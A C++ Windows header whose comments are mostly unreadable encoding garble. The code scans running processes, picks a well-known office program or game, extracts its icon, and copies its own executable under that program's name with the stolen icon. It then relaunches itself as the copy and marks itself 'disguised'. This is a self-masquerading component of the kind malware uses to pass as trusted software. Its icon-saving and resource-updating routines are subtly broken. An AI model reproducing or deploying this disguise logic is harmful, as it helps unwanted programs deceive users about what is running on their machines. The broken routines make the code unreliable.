#pragma once
#include <windows.h>
#include <psapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <vector>
#include <map>
#include <string>
#include <algorithm>
#include <chrono>
#include <fstream>
#include <unordered_set>
#include <filesystem>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "Version.lib")

namespace fs = std::filesystem;

// ����ͼ���ļ��ṹ
#pragma pack(push, 1)
typedef struct {
    WORD idReserved;
    WORD idType;
    WORD idCount;
} ICONDIR;

typedef struct {
    BYTE bWidth;
    BYTE bHeight;
    BYTE bColorCount;
    BYTE bReserved;
    WORD wPlanes;
    WORD wBitCount;
    DWORD dwBytesInRes;
    DWORD dwImageOffset;
} ICONDIRENTRY;
#pragma pack(pop)

// ȫ�ֱ���
bool g_isDisguised = false;
HANDLE g_hMutex = NULL;

// �����Ϣ�ṹ�� - ��ǿ��
struct SoftwareInfo {
    std::string name;
    std::string path;
    std::string displayName;
    ULONGLONG totalTime = 0;
    FILETIME startTime;
    bool isRunning = false;
    int priority = 3; // ���ȼ���1=�칫���, 2=֪����Ϸ, 3=�������
    bool hasIcon = false; // �������Ƿ��п���ȡͼ��
    int iconQuality = 0; // ������ͼ���������֣����ڳߴ����ɫ��ȣ�
};

// �ַ���ת����������
class StringConverter {
public:
    static std::wstring ANSIToUnicode(const std::string& str) {
        if (str.empty()) return L"";
        int wideLen = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
        if (wideLen == 0) return L"";
        std::wstring wideStr;
        wideStr.resize(wideLen);
        MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wideStr[0], wideLen);
        if (!wideStr.empty() && wideStr.back() == L'\0') {
            wideStr.pop_back();
        }
        return wideStr;
    }

    static std::string UnicodeToANSI(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int ansiLen = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
        if (ansiLen == 0) return "";
        std::string ansiStr;
        ansiStr.resize(ansiLen);
        WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &ansiStr[0], ansiLen, NULL, NULL);
        if (!ansiStr.empty() && ansiStr.back() == '\0') {
            ansiStr.pop_back();
        }
        return ansiStr;
    }
};

// �ļ���������
class FileNameHelper {
public:
    // �����ļ�����ȥ���ظ���׺�ͷǷ��ַ�
    static std::string CleanFileName(const std::string& fileName) {
        if (fileName.empty()) return "";

        std::string cleanName = fileName;

        // ȥ�������Ŀ�ִ���ļ���׺
        std::vector<std::string> extensions = { ".exe", ".lnk", ".bat", ".com" };
        for (const auto& ext : extensions) {
            if (cleanName.size() > ext.size()) {
                std::string end = cleanName.substr(cleanName.size() - ext.size());
                std::transform(end.begin(), end.end(), end.begin(), ::tolower);
                if (end == ext) {
                    cleanName = cleanName.substr(0, cleanName.size() - ext.size());
                    break;
                }
            }
        }

        // �滻�Ƿ��ַ�Ϊ�»���
        std::replace_if(cleanName.begin(), cleanName.end(),
            [](char c) {
                return !isalnum(c) && c != ' ' && c != '-' && c != '_' && c != '.';
            }, '_');

        // �����ļ�������
        if (cleanName.size() > 50) {
            cleanName = cleanName.substr(0, 50);
        }

        return cleanName;
    }

    // ����ļ��Ƿ����
    static bool FileExists(const std::string& filePath) {
        return fs::exists(filePath);
    }
};

class SoftwareTracker {
private:
    std::map<std::string, SoftwareInfo> softwareMap;

    // ��ǿ��֪������б�
    const std::unordered_set<std::string> officeSoftware = {
        "winword", "excel", "powerpnt", "outlook", "onenote", "access", "project",
        "visio", "publisher", "teams", "acrobat", "photoshop", "illustrator",
        "premiere", "after effects", "audition", "lightroom", "indesign",
        "coreldraw", "autocad", "sketchup", "solidworks", "maya", "blender",
        "zbrush", "notepad++", "vscode", "sublime", "intellij", "eclipse",
        "pycharm", "webstorm", "android studio", "xcode", "visual studio",
        "word", "ppt", "powerpoint", "chrome", "firefox", "edge", "browser",
        "office", "adobe", "microsoft", "google", "mozilla", "opera", "safari"
    };

    const std::unordered_set<std::string> gameSoftware = {
        "steam", "epic", "origin", "battle.net", "ubisoft", "gog", "riot",
        "bethesda", "rockstar", "ea", "minecraft", "fortnite", "league",
        "dota", "overwatch", "valorant", "csgo", "warzone", "among us",
        "roblox", "genshin", "eldenring", "cyberpunk", "witcher", "fallout",
        "skyrim", "wow", "diablo", "starcraft", "hearthstone", "battlegrounds"
    };

    bool IsSystemProcess(const std::string& processPath) {
        if (processPath.empty()) return true;

        char systemDir[MAX_PATH] = { 0 };
        char windowsDir[MAX_PATH] = { 0 };
        GetSystemDirectoryA(systemDir, MAX_PATH);
        GetWindowsDirectoryA(windowsDir, MAX_PATH);

        std::string pathLower = processPath;
        std::transform(pathLower.begin(), pathLower.end(), pathLower.begin(), ::tolower);

        std::vector<std::string> systemPatterns = {
            "\\windows\\", "\\system32\\", "\\syswow64\\", "\\drivers\\",
            "svchost.exe", "explorer.exe", "taskmgr.exe", "winlogon.exe",
            "csrss.exe", "smss.exe", "lsass.exe", "services.exe"
        };

        for (const auto& pattern : systemPatterns) {
            if (pathLower.find(pattern) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    std::string GetProcessPath(DWORD processID) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (!hProcess) return "";

        char path[MAX_PATH];
        DWORD pathSize = MAX_PATH;
        if (QueryFullProcessImageNameA(hProcess, 0, path, &pathSize)) {
            CloseHandle(hProcess);
            return std::string(path);
        }
        CloseHandle(hProcess);
        return "";
    }

    int GetSoftwarePriority(const std::string& processName) {
        std::string nameLower = processName;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

        for (const auto& keyword : officeSoftware) {
            if (nameLower.find(keyword) != std::string::npos) {
                return 1;
            }
        }

        for (const auto& keyword : gameSoftware) {
            if (nameLower.find(keyword) != std::string::npos) {
                return 2;
            }
        }

        return 3;
    }

    // ���ͼ������Բ���������
    bool CheckIconAvailability(const std::string& filePath, int& qualityScore) {
        HICON hIcon = ExtractIconFromFile(filePath);
        if (!hIcon) {
            qualityScore = 0;
            return false;
        }

        // ����ͼ������
        ICONINFO iconInfo;
        if (GetIconInfo(hIcon, &iconInfo)) {
            BITMAP bmColor;
            GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmColor);

            // �������֣����ڳߴ����ɫ���
            qualityScore = bmColor.bmWidth * bmColor.bmHeight * (bmColor.bmBitsPixel / 8);

            DeleteObject(iconInfo.hbmColor);
            DeleteObject(iconInfo.hbmMask);
        }
        else {
            qualityScore = 1; // ������
        }

        DestroyIcon(hIcon);
        return true;
    }

public:
    // ���ļ���ȡͼ�꣨���������� - ��Ϊ��������
    static HICON ExtractIconFromFile(const std::string& filePath) {
        HICON icon = nullptr;

        // ����1: ʹ��SHGetFileInfo��ȡͼ��
        SHFILEINFOA shInfo;
        if (SHGetFileInfoA(filePath.c_str(), 0, &shInfo, sizeof(shInfo),
            SHGFI_ICON | SHGFI_LARGEICON)) {
            icon = shInfo.hIcon;
        }

        // ����2: ��Ϊ��ѡ�������ӿ�ִ���ļ���Դ����ȡ
        if (!icon) {
            HMODULE hModule = LoadLibraryExA(filePath.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
            if (hModule) {
                // ������ȡ��һ��ͼ����Դ
                icon = (HICON)LoadImage(hModule, MAKEINTRESOURCE(1), IMAGE_ICON,
                    GetSystemMetrics(SM_CXICON), GetSystemMetrics(SM_CYICON),
                    LR_DEFAULTCOLOR);
                FreeLibrary(hModule);
            }
        }

        return icon;
    }

    // ��ȡĿ�����������֪���Ⱥ�ͼ��������
    SoftwareInfo GetTargetSoftwareByFameAndIcon() {
        DWORD processes[1024], cbNeeded;
        if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
            return SoftwareInfo();
        }

        DWORD processCount = cbNeeded / sizeof(DWORD);
        std::vector<SoftwareInfo> candidateList;

        for (DWORD i = 0; i < processCount; i++) {
            if (processes[i] == 0) continue;

            std::string path = GetProcessPath(processes[i]);
            if (path.empty() || IsSystemProcess(path)) continue;

            std::string name = PathFindFileNameA(path.c_str());
            int priority = GetSoftwarePriority(name);

            // ֻ����֪�����
            if (priority < 3) {
                int iconQuality = 0;
                bool hasIcon = CheckIconAvailability(path, iconQuality);

                SoftwareInfo info;
                info.name = name;
                info.path = path;
                info.displayName = name;
                info.priority = priority;
                info.hasIcon = hasIcon;
                info.iconQuality = iconQuality;

                candidateList.push_back(info);
            }
        }

        if (candidateList.empty()) {
            return SoftwareInfo();
        }

        // �����ȼ���ͼ����������
        // ����ѡ��: 1) �칫��� > 2) ��Ϸ��� > 3) �и�����ͼ��� > 4) ����ͨͼ��� > 5) ��ͼ���
        std::sort(candidateList.begin(), candidateList.end(),
            [](const SoftwareInfo& a, const SoftwareInfo& b) {
                // ���Ȱ�����������ȼ�����
                if (a.priority != b.priority) {
                    return a.priority < b.priority;
                }
                // ͬ��������У���ͼ�������
                if (a.hasIcon != b.hasIcon) {
                    return a.hasIcon > b.hasIcon;
                }
                // ����ͼ�������£���ͼ����������
                if (a.hasIcon && b.hasIcon) {
                    return a.iconQuality > b.iconQuality;
                }
                // �����������������
                return a.name < b.name;
            });

        return candidateList[0];
    }
};

// ͼ�괦����
class IconManager {
public:
    static HICON ExtractIconFromFile(const std::string& filePath) {
        return SoftwareTracker::ExtractIconFromFile(filePath);
    }

    static bool SaveIconToFile(HICON hIcon, const std::string& filePath) {
        if (!hIcon) return false;

        std::wstring wFilePath = StringConverter::ANSIToUnicode(filePath);
        HANDLE hFile = CreateFileW(wFilePath.c_str(), GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        ICONINFO iconInfo;
        if (!GetIconInfo(hIcon, &iconInfo)) {
            CloseHandle(hFile);
            return false;
        }

        BITMAP bmColor, bmMask;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmColor);
        GetObject(iconInfo.hbmMask, sizeof(BITMAP), &bmMask);

        DWORD colorSize = bmColor.bmWidth * bmColor.bmHeight * (bmColor.bmBitsPixel / 8);
        DWORD maskSize = bmMask.bmWidth * bmMask.bmHeight * (bmMask.bmBitsPixel / 8);

        ICONDIR iconDir = { 0, 1, 1 };
        ICONDIRENTRY entry;
        entry.bWidth = static_cast<BYTE>(bmColor.bmWidth);
        entry.bHeight = static_cast<BYTE>(bmColor.bmHeight);
        entry.bColorCount = 0;
        entry.bReserved = 0;
        entry.wPlanes = bmColor.bmPlanes;
        entry.wBitCount = bmColor.bmBitsPixel;
        entry.dwBytesInRes = sizeof(BITMAPINFOHEADER) + colorSize + maskSize;
        entry.dwImageOffset = sizeof(ICONDIR) + sizeof(ICONDIRENTRY);

        DWORD bytesWritten;
        WriteFile(hFile, &iconDir, sizeof(ICONDIR), &bytesWritten, NULL);
        WriteFile(hFile, &entry, sizeof(ICONDIRENTRY), &bytesWritten, NULL);

        DeleteObject(iconInfo.hbmColor);
        DeleteObject(iconInfo.hbmMask);
        CloseHandle(hFile);

        return true;
    }
};

// �ļ�������
class FileManager {
public:
    static bool CopyAndRenameSelf(const std::string& newName, const std::string& iconPath = "") {
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        char currentDir[MAX_PATH];
        strcpy_s(currentDir, MAX_PATH, currentPath);
        PathRemoveFileSpecA(currentDir);

        // ʹ��FileNameHelper�����ļ���
        std::string cleanName = FileNameHelper::CleanFileName(newName);
        std::string newPath = std::string(currentDir) + "\\" + cleanName + ".exe";

        std::cout << "���Ը����ļ�: " << currentPath << " -> " << newPath << std::endl;

        if (!CopyFileA(currentPath, newPath.c_str(), FALSE)) {
            std::cout << "�ļ�����ʧ�ܣ��������: " << GetLastError() << std::endl;
            return false;
        }

        // �޸�ͼ��
        if (!iconPath.empty() && FileNameHelper::FileExists(iconPath)) {
            if (ChangeExeIcon(newPath, iconPath)) {
                std::cout << "ͼ���޸ĳɹ�" << std::endl;
            }
            else {
                std::cout << "ͼ���޸�ʧ��" << std::endl;
            }
        }

        return true;
    }

    static bool ChangeExeIcon(const std::string& exePath, const std::string& iconPath) {
        // ����ļ��Ƿ����
        if (!FileNameHelper::FileExists(exePath) || !FileNameHelper::FileExists(iconPath)) {
            std::cout << "�ļ�������: " << exePath << " �� " << iconPath << std::endl;
            return false;
        }

        std::ifstream iconFile(iconPath, std::ios::binary | std::ios::ate);
        if (!iconFile) {
            std::cout << "�޷���ͼ���ļ�: " << iconPath << std::endl;
            return false;
        }

        std::streamsize size = iconFile.tellg();
        iconFile.seekg(0, std::ios::beg);
        std::vector<char> iconData(size);
        if (!iconFile.read(iconData.data(), size)) {
            std::cout << "��ȡͼ���ļ�ʧ��: " << iconPath << std::endl;
            return false;
        }

        std::wstring wExePath = StringConverter::ANSIToUnicode(exePath);
        HANDLE hUpdate = BeginUpdateResourceW(wExePath.c_str(), FALSE);
        if (!hUpdate) {
            std::cout << "BeginUpdateResourceʧ�ܣ��������: " << GetLastError() << std::endl;
            return false;
        }

        // ����ͼ����Դ
        if (!UpdateResourceW(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            iconData.data(), static_cast<DWORD>(size))) {
            std::cout << "UpdateResourceʧ�ܣ��������: " << GetLastError() << std::endl;
            EndUpdateResourceW(hUpdate, TRUE);
            return false;
        }

        if (!EndUpdateResourceW(hUpdate, FALSE)) {
            std::cout << "EndUpdateResourceʧ�ܣ��������: " << GetLastError() << std::endl;
            return false;
        }

        return true;
    }
};

// ��������������
class RestartManager {
public:
    static bool IsAlreadyDisguised() {
        char currentExePath[MAX_PATH];
        GetModuleFileNameA(NULL, currentExePath, MAX_PATH);
        std::string currentExeName = PathFindFileNameA(currentExePath);
        return currentExeName != "original_name.exe";
    }

    static void RestartApplication(const std::string& newName) {
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        char currentDir[MAX_PATH];
        strcpy_s(currentDir, MAX_PATH, currentPath);
        PathRemoveFileSpecA(currentDir);

        // ʹ��FileNameHelper�����ļ���
        std::string cleanName = FileNameHelper::CleanFileName(newName);
        std::string newPath = std::string(currentDir) + "\\" + cleanName + ".exe";

        std::cout << "������������: " << newPath << std::endl;

        // ������ļ��Ƿ����
        if (!FileNameHelper::FileExists(newPath)) {
            std::cout << "���ļ�������: " << newPath << std::endl;
            return;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // ����������
        std::string commandLine = "\"" + newPath + "\" --restarted";

        if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::cout << "�³��������ɹ����˳���ǰ����..." << std::endl;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            exit(0);
        }
        else {
            std::cout << "����ʧ�ܣ��������: " << GetLastError() << std::endl;
        }
    }
};

// ���߼�����
int mainc() {
    // �����������ֹ��ʵ������
    g_hMutex = CreateMutexA(NULL, FALSE, "Global\\SoftwareTrackerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "�����Ѿ���������" << std::endl;
        CloseHandle(g_hMutex);
        return 1;
    }

    std::cout << "��ʼ����֪�����������ѡ���и�����ͼ��ģ�..." << std::endl;

    SoftwareTracker tracker;
    SoftwareInfo target = tracker.GetTargetSoftwareByFameAndIcon();

    if (target.name.empty()) {
        std::cout << "δ�ҵ�֪���İ칫�������Ϸ" << std::endl;
        CloseHandle(g_hMutex);
        return 1;
    }

    std::cout << "��⵽Ŀ�����: " << target.name << std::endl;
    std::cout << "�������: " << (target.priority == 1 ? "�칫���" : "��Ϸ���") << std::endl;
    std::cout << "ͼ�����: " << (target.hasIcon ? "��" : "��") << std::endl;
    if (target.hasIcon) {
        std::cout << "ͼ����������: " << target.iconQuality << std::endl;
    }

    // ��ȡͼ�ֻ꣨������ͼ�������£�
    HICON hIcon = nullptr;
    std::string iconPath;

    if (target.hasIcon) {
        hIcon = IconManager::ExtractIconFromFile(target.path);
        if (hIcon) {
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);

            std::string cleanName = FileNameHelper::CleanFileName(target.name);
            iconPath = std::string(tempPath) + cleanName + ".ico";

            if (IconManager::SaveIconToFile(hIcon, iconPath)) {
                std::cout << "ͼ����ȡ�ɹ�: " << iconPath << std::endl;
            }
            else {
                std::cout << "ͼ�걣��ʧ��" << std::endl;
                iconPath.clear();
            }
            DestroyIcon(hIcon);
        }
    }
    else {
        std::cout << "Ŀ�����û�п���ȡ��ͼ�꣬����ͼ�괦��" << std::endl;
    }

    // ���Ʋ�����������
    if (FileManager::CopyAndRenameSelf(target.name, iconPath)) {
        std::cout << "�����Ƴɹ���׼������..." << std::endl;

        // ���Ϊ��αװ
        g_isDisguised = true;

        // ��������
        RestartManager::RestartApplication(target.name);
    }

    CloseHandle(g_hMutex);
    return 0;
}

